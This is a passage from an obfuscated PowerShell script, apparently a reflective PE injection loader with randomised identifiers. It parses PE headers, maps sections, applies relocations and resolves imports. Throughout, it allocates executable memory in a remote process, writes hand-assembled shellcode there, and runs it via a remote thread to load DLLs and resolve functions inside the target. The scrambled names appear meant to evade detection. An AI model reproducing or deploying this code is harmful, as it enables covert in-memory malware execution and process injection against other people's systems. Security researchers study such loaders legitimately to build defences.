		[Parameter(Position = 1, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$stADljpQ,
		[Parameter(Position = 2, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$xKjVQlKx
		)
		if ($QuNkENTk -eq $buwbSEkt -or $QuNkENTk -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		$brIcZJPz = New-Object System.Object
		$cWsYqupr = HUhvTeLH -PEHandle $QuNkENTk -Win32Types $stADljpQ
		$brIcZJPz | Add-Member -MemberType NoteProperty -Name PEHandle -Value $QuNkENTk
		$brIcZJPz | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($cWsYqupr.IMAGE_NT_HEADERS)
		$brIcZJPz | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($cWsYqupr.NtHeadersPtr)
		$brIcZJPz | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($cWsYqupr.PE64Bit)
		$brIcZJPz | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($cWsYqupr.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		if ($brIcZJPz.PE64Bit -eq $rvAMLFnZ)
		{
			[IntPtr]$NCPxpTuU = [IntPtr](XcvoUanJ ([Int64]$brIcZJPz.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$stADljpQ.IMAGE_NT_HEADERS64)))
			$brIcZJPz | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $NCPxpTuU
		}
		else
		{
			[IntPtr]$NCPxpTuU = [IntPtr](XcvoUanJ ([Int64]$brIcZJPz.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$stADljpQ.IMAGE_NT_HEADERS32)))
			$brIcZJPz | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $NCPxpTuU
		}
		if (($cWsYqupr.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $xKjVQlKx.IMAGE_FILE_DLL) -eq $xKjVQlKx.IMAGE_FILE_DLL)
		{
			$brIcZJPz | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($cWsYqupr.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $xKjVQlKx.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $xKjVQlKx.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$brIcZJPz | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		return $brIcZJPz
	}
	Function ZbvNTvKP
	{
		Param(
		[Parameter(Position=0, Mandatory=$rvAMLFnZ)]
		[IntPtr]
		$ecUUHIyn,
		[Parameter(Position=1, Mandatory=$rvAMLFnZ)]
		[IntPtr]
		$qBDrWsPe
		)
		$cglPPIRl = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$VDLogaVk = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($qBDrWsPe)
		$rtDfWKKO = [UIntPtr][UInt64]([UInt64]$VDLogaVk.Length + 1)
		$wpHCUzRh = $gxNuhWuM.VirtualAllocEx.Invoke($ecUUHIyn, [IntPtr]::Zero, $rtDfWKKO, $xKjVQlKx.MEM_COMMIT -bor $xKjVQlKx.MEM_RESERVE, $xKjVQlKx.PAGE_READWRITE)
		if ($wpHCUzRh -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}
		[UIntPtr]$oukMtmgo = [UIntPtr]::Zero
		$UYYLFWoE = $gxNuhWuM.WriteProcessMemory.Invoke($ecUUHIyn, $wpHCUzRh, $qBDrWsPe, $rtDfWKKO, [Ref]$oukMtmgo)
		if ($UYYLFWoE -eq $WCARTiiv)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($rtDfWKKO -ne $oukMtmgo)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		$DawHxPwx = $gxNuhWuM.GetModuleHandle.Invoke("kernel32.dll")
		$EVqrncXKoWucfjrAAddr = $gxNuhWuM.GetProcAddress.Invoke($DawHxPwx, "LoadLibraryA") 
		[IntPtr]$OdWNSSKk = [IntPtr]::Zero
		if ($brIcZJPz.PE64Bit -eq $rvAMLFnZ)
		{
			$EVqrncXKoWucfjrARetMem = $gxNuhWuM.VirtualAllocEx.Invoke($ecUUHIyn, [IntPtr]::Zero, $rtDfWKKO, $xKjVQlKx.MEM_COMMIT -bor $xKjVQlKx.MEM_RESERVE, $xKjVQlKx.PAGE_READWRITE)
			if ($EVqrncXKoWucfjrARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			$EVqrncXKoWucfjrSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$EVqrncXKoWucfjrSC2 = @(0x48, 0xba)
			$EVqrncXKoWucfjrSC3 = @(0xff, 0xd2, 0x48, 0xba)
			$EVqrncXKoWucfjrSC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			$FhfbCDRv = $EVqrncXKoWucfjrSC1.Length + $EVqrncXKoWucfjrSC2.Length + $EVqrncXKoWucfjrSC3.Length + $EVqrncXKoWucfjrSC4.Length + ($cglPPIRl * 3)
			$gKkRrEWc = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($FhfbCDRv)
			$gKkRrEWcOriginal = $gKkRrEWc
			SvvLofPM -Bytes $EVqrncXKoWucfjrSC1 -MemoryAddress $gKkRrEWc
			$gKkRrEWc = XcvoUanJ $gKkRrEWc ($EVqrncXKoWucfjrSC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($wpHCUzRh, $gKkRrEWc, $WCARTiiv)
			$gKkRrEWc = XcvoUanJ $gKkRrEWc ($cglPPIRl)
			SvvLofPM -Bytes $EVqrncXKoWucfjrSC2 -MemoryAddress $gKkRrEWc
			$gKkRrEWc = XcvoUanJ $gKkRrEWc ($EVqrncXKoWucfjrSC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($EVqrncXKoWucfjrAAddr, $gKkRrEWc, $WCARTiiv)
			$gKkRrEWc = XcvoUanJ $gKkRrEWc ($cglPPIRl)
			SvvLofPM -Bytes $EVqrncXKoWucfjrSC3 -MemoryAddress $gKkRrEWc
			$gKkRrEWc = XcvoUanJ $gKkRrEWc ($EVqrncXKoWucfjrSC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($EVqrncXKoWucfjrARetMem, $gKkRrEWc, $WCARTiiv)
			$gKkRrEWc = XcvoUanJ $gKkRrEWc ($cglPPIRl)
			SvvLofPM -Bytes $EVqrncXKoWucfjrSC4 -MemoryAddress $gKkRrEWc
			$gKkRrEWc = XcvoUanJ $gKkRrEWc ($EVqrncXKoWucfjrSC4.Length)
			$vvyFxbJw = $gxNuhWuM.VirtualAllocEx.Invoke($ecUUHIyn, [IntPtr]::Zero, [UIntPtr][UInt64]$FhfbCDRv, $xKjVQlKx.MEM_COMMIT -bor $xKjVQlKx.MEM_RESERVE, $xKjVQlKx.PAGE_EXECUTE_READWRITE)
			if ($vvyFxbJw -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			$UYYLFWoE = $gxNuhWuM.WriteProcessMemory.Invoke($ecUUHIyn, $vvyFxbJw, $gKkRrEWcOriginal, [UIntPtr][UInt64]$FhfbCDRv, [Ref]$oukMtmgo)
			if (($UYYLFWoE -eq $WCARTiiv) -or ([UInt64]$oukMtmgo -ne [UInt64]$FhfbCDRv))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			$NEspbwgz = FYISLKhm -ProcessHandle $ecUUHIyn -StartAddress $vvyFxbJw -Win32Functions $gxNuhWuM
			$mGWEuovT = $gxNuhWuM.WaitForSingleObject.Invoke($NEspbwgz, 20000)
			if ($mGWEuovT -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			[IntPtr]$ngClblfJ = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($cglPPIRl)
			$mGWEuovT = $gxNuhWuM.ReadProcessMemory.Invoke($ecUUHIyn, $EVqrncXKoWucfjrARetMem, $ngClblfJ, [UIntPtr][UInt64]$cglPPIRl, [Ref]$oukMtmgo)
			if ($mGWEuovT -eq $WCARTiiv)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$OdWNSSKk = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ngClblfJ, [Type][IntPtr])
			$gxNuhWuM.VirtualFreeEx.Invoke($ecUUHIyn, $EVqrncXKoWucfjrARetMem, [UIntPtr][UInt64]0, $xKjVQlKx.MEM_RELEASE) | Out-Null
			$gxNuhWuM.VirtualFreeEx.Invoke($ecUUHIyn, $vvyFxbJw, [UIntPtr][UInt64]0, $xKjVQlKx.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$NEspbwgz = FYISLKhm -ProcessHandle $ecUUHIyn -StartAddress $EVqrncXKoWucfjrAAddr -ArgumentPtr $wpHCUzRh -Win32Functions $gxNuhWuM
			$mGWEuovT = $gxNuhWuM.WaitForSingleObject.Invoke($NEspbwgz, 20000)
			if ($mGWEuovT -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			[Int32]$QWpUcCvj = 0
			$mGWEuovT = $gxNuhWuM.GetExitCodeThread.Invoke($NEspbwgz, [Ref]$QWpUcCvj)
			if (($mGWEuovT -eq 0) -or ($QWpUcCvj -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			[IntPtr]$OdWNSSKk = [IntPtr]$QWpUcCvj
		}
		$gxNuhWuM.VirtualFreeEx.Invoke($ecUUHIyn, $wpHCUzRh, [UIntPtr][UInt64]0, $xKjVQlKx.MEM_RELEASE) | Out-Null
		return $OdWNSSKk
	}
	Function UalGwigJ
	{
		Param(
		[Parameter(Position=0, Mandatory=$rvAMLFnZ)]
		[IntPtr]
		$ecUUHIyn,
		[Parameter(Position=1, Mandatory=$rvAMLFnZ)]
		[IntPtr]
		$rpGJMGGU,
		[Parameter(Position=2, Mandatory=$rvAMLFnZ)]
		[IntPtr]
		$wTitHodg,
        [Parameter(Position=3, Mandatory=$rvAMLFnZ)]
        [Bool]
        $zTnMbHGJ
		)
		$cglPPIRl = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[IntPtr]$gfbVdrdG = [IntPtr]::Zero   
        if (-not $zTnMbHGJ)
        {
        	$PlDRtSek = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($wTitHodg)
		    $PlDRtSekSize = [UIntPtr][UInt64]([UInt64]$PlDRtSek.Length + 1)
		    $gfbVdrdG = $gxNuhWuM.VirtualAllocEx.Invoke($ecUUHIyn, [IntPtr]::Zero, $PlDRtSekSize, $xKjVQlKx.MEM_COMMIT -bor $xKjVQlKx.MEM_RESERVE, $xKjVQlKx.PAGE_READWRITE)
		    if ($gfbVdrdG -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }
		    [UIntPtr]$oukMtmgo = [UIntPtr]::Zero
		    $UYYLFWoE = $gxNuhWuM.WriteProcessMemory.Invoke($ecUUHIyn, $gfbVdrdG, $wTitHodg, $PlDRtSekSize, [Ref]$oukMtmgo)
		    if ($UYYLFWoE -eq $WCARTiiv)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($PlDRtSekSize -ne $oukMtmgo)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
        }
        else
        {
            $gfbVdrdG = $wTitHodg
        }
		$DawHxPwx = $gxNuhWuM.GetModuleHandle.Invoke("kernel32.dll")
		$vtGHjvgk = $gxNuhWuM.GetProcAddress.Invoke($DawHxPwx, "GetProcAddress") 
		$LPyAtuYbRetMem = $gxNuhWuM.VirtualAllocEx.Invoke($ecUUHIyn, [IntPtr]::Zero, [UInt64][UInt64]$cglPPIRl, $xKjVQlKx.MEM_COMMIT -bor $xKjVQlKx.MEM_RESERVE, $xKjVQlKx.PAGE_READWRITE)
		if ($LPyAtuYbRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		[Byte[]]$LPyAtuYbSC = @()
		if ($brIcZJPz.PE64Bit -eq $rvAMLFnZ)
		{
			$LPyAtuYbSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LPyAtuYbSC2 = @(0x48, 0xba)
			$LPyAtuYbSC3 = @(0x48, 0xb8)
			$LPyAtuYbSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$LPyAtuYbSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$LPyAtuYbSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$LPyAtuYbSC2 = @(0xb9)
			$LPyAtuYbSC3 = @(0x51, 0x50, 0xb8)
			$LPyAtuYbSC4 = @(0xff, 0xd0, 0xb9)
			$LPyAtuYbSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$FhfbCDRv = $LPyAtuYbSC1.Length + $LPyAtuYbSC2.Length + $LPyAtuYbSC3.Length + $LPyAtuYbSC4.Length + $LPyAtuYbSC5.Length + ($cglPPIRl * 4)
		$gKkRrEWc = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($FhfbCDRv)
		$gKkRrEWcOriginal = $gKkRrEWc
		SvvLofPM -Bytes $LPyAtuYbSC1 -MemoryAddress $gKkRrEWc
		$gKkRrEWc = XcvoUanJ $gKkRrEWc ($LPyAtuYbSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($rpGJMGGU, $gKkRrEWc, $WCARTiiv)
		$gKkRrEWc = XcvoUanJ $gKkRrEWc ($cglPPIRl)
		SvvLofPM -Bytes $LPyAtuYbSC2 -MemoryAddress $gKkRrEWc
		$gKkRrEWc = XcvoUanJ $gKkRrEWc ($LPyAtuYbSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($gfbVdrdG, $gKkRrEWc, $WCARTiiv)
		$gKkRrEWc = XcvoUanJ $gKkRrEWc ($cglPPIRl)
		SvvLofPM -Bytes $LPyAtuYbSC3 -MemoryAddress $gKkRrEWc
		$gKkRrEWc = XcvoUanJ $gKkRrEWc ($LPyAtuYbSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($vtGHjvgk, $gKkRrEWc, $WCARTiiv)
		$gKkRrEWc = XcvoUanJ $gKkRrEWc ($cglPPIRl)
		SvvLofPM -Bytes $LPyAtuYbSC4 -MemoryAddress $gKkRrEWc
		$gKkRrEWc = XcvoUanJ $gKkRrEWc ($LPyAtuYbSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($LPyAtuYbRetMem, $gKkRrEWc, $WCARTiiv)
		$gKkRrEWc = XcvoUanJ $gKkRrEWc ($cglPPIRl)
		SvvLofPM -Bytes $LPyAtuYbSC5 -MemoryAddress $gKkRrEWc
		$gKkRrEWc = XcvoUanJ $gKkRrEWc ($LPyAtuYbSC5.Length)
		$vvyFxbJw = $gxNuhWuM.VirtualAllocEx.Invoke($ecUUHIyn, [IntPtr]::Zero, [UIntPtr][UInt64]$FhfbCDRv, $xKjVQlKx.MEM_COMMIT -bor $xKjVQlKx.MEM_RESERVE, $xKjVQlKx.PAGE_EXECUTE_READWRITE)
		if ($vvyFxbJw -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		[UIntPtr]$oukMtmgo = [UIntPtr]::Zero
		$UYYLFWoE = $gxNuhWuM.WriteProcessMemory.Invoke($ecUUHIyn, $vvyFxbJw, $gKkRrEWcOriginal, [UIntPtr][UInt64]$FhfbCDRv, [Ref]$oukMtmgo)
		if (($UYYLFWoE -eq $WCARTiiv) -or ([UInt64]$oukMtmgo -ne [UInt64]$FhfbCDRv))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		$NEspbwgz = FYISLKhm -ProcessHandle $ecUUHIyn -StartAddress $vvyFxbJw -Win32Functions $gxNuhWuM
		$mGWEuovT = $gxNuhWuM.WaitForSingleObject.Invoke($NEspbwgz, 20000)
		if ($mGWEuovT -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		[IntPtr]$ngClblfJ = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($cglPPIRl)
		$mGWEuovT = $gxNuhWuM.ReadProcessMemory.Invoke($ecUUHIyn, $LPyAtuYbRetMem, $ngClblfJ, [UIntPtr][UInt64]$cglPPIRl, [Ref]$oukMtmgo)
		if (($mGWEuovT -eq $WCARTiiv) -or ($oukMtmgo -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$VwSAxkdw = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ngClblfJ, [Type][IntPtr])
		$gxNuhWuM.VirtualFreeEx.Invoke($ecUUHIyn, $vvyFxbJw, [UIntPtr][UInt64]0, $xKjVQlKx.MEM_RELEASE) | Out-Null
		$gxNuhWuM.VirtualFreeEx.Invoke($ecUUHIyn, $LPyAtuYbRetMem, [UIntPtr][UInt64]0, $xKjVQlKx.MEM_RELEASE) | Out-Null
        if (-not $zTnMbHGJ)
        {
            $gxNuhWuM.VirtualFreeEx.Invoke($ecUUHIyn, $gfbVdrdG, [UIntPtr][UInt64]0, $xKjVQlKx.MEM_RELEASE) | Out-Null
        }
		return $VwSAxkdw
	}
	Function uVzUIyHr
	{
		Param(
		[Parameter(Position = 0, Mandatory = $rvAMLFnZ)]
		[Byte[]]
		$YyOqIfFM,
		[Parameter(Position = 1, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$brIcZJPz,
		[Parameter(Position = 2, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$gxNuhWuM,
		[Parameter(Position = 3, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$stADljpQ
		)
		for( $EVqrncXK = 0; $EVqrncXK -lt $brIcZJPz.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $EVqrncXK++)
		{
			[IntPtr]$NCPxpTuU = [IntPtr](XcvoUanJ ([Int64]$brIcZJPz.SectionHeaderPtr) ($EVqrncXK * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$stADljpQ.IMAGE_SECTION_HEADER)))
			$CJFdELFH = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NCPxpTuU, [Type]$stADljpQ.IMAGE_SECTION_HEADER)
			[IntPtr]$GqoacyON = [IntPtr](XcvoUanJ ([Int64]$brIcZJPz.PEHandle) ([Int64]$CJFdELFH.VirtualAddress))
			$GVzAKQMDOfRawData = $CJFdELFH.SizeOfRawData
			if ($CJFdELFH.PointerToRawData -eq 0)
			{
				$GVzAKQMDOfRawData = 0
			}
			if ($GVzAKQMDOfRawData -gt $CJFdELFH.VirtualSize)
			{
				$GVzAKQMDOfRawData = $CJFdELFH.VirtualSize
			}
			if ($GVzAKQMDOfRawData -gt 0)
			{
				zCLXNXOI -DebugString "uVzUIyHr::MarshalCopy" -PEInfo $brIcZJPz -StartAddress $GqoacyON -Size $GVzAKQMDOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($YyOqIfFM, [Int32]$CJFdELFH.PointerToRawData, $GqoacyON, $GVzAKQMDOfRawData)
			}
			if ($CJFdELFH.SizeOfRawData -lt $CJFdELFH.VirtualSize)
			{
				$ZyyayrPM = $CJFdELFH.VirtualSize - $GVzAKQMDOfRawData
				[IntPtr]$iaTYMTPo = [IntPtr](XcvoUanJ ([Int64]$GqoacyON) ([Int64]$GVzAKQMDOfRawData))
				zCLXNXOI -DebugString "uVzUIyHr::Memset" -PEInfo $brIcZJPz -StartAddress $iaTYMTPo -Size $ZyyayrPM | Out-Null
				$gxNuhWuM.memset.Invoke($iaTYMTPo, 0, [IntPtr]$ZyyayrPM) | Out-Null
			}
		}
	}
	Function wvoBiEAy
	{
		Param(
		[Parameter(Position = 0, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$brIcZJPz,
		[Parameter(Position = 1, Mandatory = $rvAMLFnZ)]
		[Int64]
		$GAgtPQHO,
		[Parameter(Position = 2, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$xKjVQlKx,
		[Parameter(Position = 3, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$stADljpQ
		)
		[Int64]$BmimRUum = 0
		$XOkumeAw = $rvAMLFnZ 
		[UInt32]$mXWDkdVD = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$stADljpQ.IMAGE_BASE_RELOCATION)
		if (($GAgtPQHO -eq [Int64]$brIcZJPz.EffectivePEHandle) `
				-or ($brIcZJPz.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}
		elseif ((zeePrHcq ($GAgtPQHO) ($brIcZJPz.EffectivePEHandle)) -eq $rvAMLFnZ)
		{
			$BmimRUum = MSysmFEP ($GAgtPQHO) ($brIcZJPz.EffectivePEHandle)
			$XOkumeAw = $WCARTiiv
		}
		elseif ((zeePrHcq ($brIcZJPz.EffectivePEHandle) ($GAgtPQHO)) -eq $rvAMLFnZ)
		{
			$BmimRUum = MSysmFEP ($brIcZJPz.EffectivePEHandle) ($GAgtPQHO)
		}
		[IntPtr]$qCXodrKB = [IntPtr](XcvoUanJ ([Int64]$brIcZJPz.PEHandle) ([Int64]$brIcZJPz.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($rvAMLFnZ)
		{
			$PDiggoPi = [System.Runtime.InteropServices.Marshal]::PtrToStructure($qCXodrKB, [Type]$stADljpQ.IMAGE_BASE_RELOCATION)
			if ($PDiggoPi.SizeOfBlock -eq 0)
			{
				break
			}
			[IntPtr]$akTqHCFu = [IntPtr](XcvoUanJ ([Int64]$brIcZJPz.PEHandle) ([Int64]$PDiggoPi.VirtualAddress))
			$VOzJARXi = ($PDiggoPi.SizeOfBlock - $mXWDkdVD) / 2
			for($EVqrncXK = 0; $EVqrncXK -lt $VOzJARXi; $EVqrncXK++)
			{
				$UDEVcJXo = [IntPtr](XcvoUanJ ([IntPtr]$qCXodrKB) ([Int64]$mXWDkdVD + (2 * $EVqrncXK)))
				[UInt16]$vblYlpbh = [System.Runtime.InteropServices.Marshal]::PtrToStructure($UDEVcJXo, [Type][UInt16])
				[UInt16]$WfcORtLs = $vblYlpbh -band 0x0FFF
				[UInt16]$EyfjHSKi = $vblYlpbh -band 0xF000
				for ($Kokowemh = 0; $Kokowemh -lt 12; $Kokowemh++)
				{
					$EyfjHSKi = [Math]::Floor($EyfjHSKi / 2)
				}
				if (($EyfjHSKi -eq $xKjVQlKx.IMAGE_REL_BASED_HIGHLOW) `
						-or ($EyfjHSKi -eq $xKjVQlKx.IMAGE_REL_BASED_DIR64))
				{			
					[IntPtr]$SmCAduav = [IntPtr](XcvoUanJ ([Int64]$akTqHCFu) ([Int64]$WfcORtLs))
					[IntPtr]$gEkVlVuG = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SmCAduav, [Type][IntPtr])
					if ($XOkumeAw -eq $rvAMLFnZ)
					{
						[IntPtr]$gEkVlVuG = [IntPtr](XcvoUanJ ([Int64]$gEkVlVuG) ($BmimRUum))
					}
					else
					{
						[IntPtr]$gEkVlVuG = [IntPtr](MSysmFEP ([Int64]$gEkVlVuG) ($BmimRUum))
					}				
					[System.Runtime.InteropServices.Marshal]::StructureToPtr($gEkVlVuG, $SmCAduav, $WCARTiiv) | Out-Null
				}
				elseif ($EyfjHSKi -ne $xKjVQlKx.IMAGE_REL_BASED_ABSOLUTE)
				{
					Throw "Unknown relocation found, relocation value: $EyfjHSKi, relocationinfo: $vblYlpbh"
				}
			}
			$qCXodrKB = [IntPtr](XcvoUanJ ([Int64]$qCXodrKB) ([Int64]$PDiggoPi.SizeOfBlock))
		}
	}
	Function RjJclWrf
	{
		Param(
		[Parameter(Position = 0, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$brIcZJPz,
		[Parameter(Position = 1, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$gxNuhWuM,
		[Parameter(Position = 2, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$stADljpQ,
		[Parameter(Position = 3, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$xKjVQlKx,
		[Parameter(Position = 4, Mandatory = $WCARTiiv)]
		[IntPtr]
		$ecUUHIyn
		)
		$awpbvApR = $WCARTiiv
		if ($brIcZJPz.PEHandle -ne $brIcZJPz.EffectivePEHandle)
		{
			$awpbvApR = $rvAMLFnZ
		}
		if ($brIcZJPz.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$fUqopOrn = XcvoUanJ ([Int64]$brIcZJPz.PEHandle) ([Int64]$brIcZJPz.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($rvAMLFnZ)
			{
				$HAsfCErN = [System.Runtime.InteropServices.Marshal]::PtrToStructure($fUqopOrn, [Type]$stADljpQ.IMAGE_IMPORT_DESCRIPTOR)
				if ($HAsfCErN.Characteristics -eq 0 `
						-and $HAsfCErN.FirstThunk -eq 0 `
						-and $HAsfCErN.ForwarderChain -eq 0 `
						-and $HAsfCErN.Name -eq 0 `
						-and $HAsfCErN.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}
				$TbMEnoSC = [IntPtr]::Zero
				$qBDrWsPe = (XcvoUanJ ([Int64]$brIcZJPz.PEHandle) ([Int64]$HAsfCErN.Name))
				$VDLogaVk = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($qBDrWsPe)
				if ($awpbvApR -eq $rvAMLFnZ)
				{
					$TbMEnoSC = ZbvNTvKP -RemoteProcHandle $ecUUHIyn -ImportDllPathPtr $qBDrWsPe
				}
				else
				{
					$TbMEnoSC = $gxNuhWuM.LoadLibrary.Invoke($VDLogaVk)
				}
				if (($TbMEnoSC -eq $buwbSEkt) -or ($TbMEnoSC -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $VDLogaVk"
				}
				[IntPtr]$eMdmNDHh = XcvoUanJ ($brIcZJPz.PEHandle) ($HAsfCErN.FirstThunk)
				[IntPtr]$afJBOeqY = XcvoUanJ ($brIcZJPz.PEHandle) ($HAsfCErN.Characteristics) 
				[IntPtr]$afJBOeqYVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($afJBOeqY, [Type][IntPtr])
				while ($afJBOeqYVal -ne [IntPtr]::Zero)
				{
                    $zTnMbHGJ = $WCARTiiv
                    [IntPtr]$smvkgJkzNamePtr = [IntPtr]::Zero
					[IntPtr]$nbOCUXbt = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$afJBOeqYVal -lt 0)
					{
						[IntPtr]$smvkgJkzNamePtr = [IntPtr]$afJBOeqYVal -band 0xffff 
                        $zTnMbHGJ = $rvAMLFnZ
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$afJBOeqYVal -lt 0)
					{
						[IntPtr]$smvkgJkzNamePtr = [Int64]$afJBOeqYVal -band 0xffff 
                        $zTnMbHGJ = $rvAMLFnZ
					}
					else
					{
						[IntPtr]$CamnABfy = XcvoUanJ ($brIcZJPz.PEHandle) ($afJBOeqYVal)
						$CamnABfy = XcvoUanJ $CamnABfy ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$smvkgJkzName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($CamnABfy)
                        $smvkgJkzNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($smvkgJkzName)
					}
					if ($awpbvApR -eq $rvAMLFnZ)
					{
						[IntPtr]$nbOCUXbt = UalGwigJ -RemoteProcHandle $ecUUHIyn -RemoteDllHandle $TbMEnoSC -FunctionNamePtr $smvkgJkzNamePtr -LoadByOrdinal $zTnMbHGJ
					}
					else
					{
				        [IntPtr]$nbOCUXbt = $gxNuhWuM.GetProcAddressIntPtr.Invoke($TbMEnoSC, $smvkgJkzNamePtr)
					}
					if ($nbOCUXbt -eq $buwbSEkt -or $nbOCUXbt -eq [IntPtr]::Zero)
					{
                        if ($zTnMbHGJ)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $smvkgJkzNamePtr. Dll: $VDLogaVk"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $smvkgJkzName. Dll: $VDLogaVk"
                        }
					}
					[System.Runtime.InteropServices.Marshal]::StructureToPtr($nbOCUXbt, $eMdmNDHh, $WCARTiiv)
					$eMdmNDHh = XcvoUanJ ([Int64]$eMdmNDHh) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$afJBOeqY = XcvoUanJ ([Int64]$afJBOeqY) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$afJBOeqYVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($afJBOeqY, [Type][IntPtr])
                    if ((-not $zTnMbHGJ) -and ($smvkgJkzNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($smvkgJkzNamePtr)
                        $smvkgJkzNamePtr = [IntPtr]::Zero
